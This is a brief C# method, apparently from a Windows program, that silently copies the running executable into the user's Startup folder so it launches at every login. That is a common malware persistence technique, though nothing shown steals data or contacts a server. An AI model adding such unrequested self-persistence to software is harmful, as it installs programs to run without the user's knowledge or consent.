     public static void Copyitself()
        {
            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" +thisFile;
            
                string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;
            
            try
            {
                //COPY THIS PROGRAM TO STARTUP
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
                {
                    System.IO.File.Copy(Application.ExecutablePath, Filepath);
                   
                }
            
            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }
        }
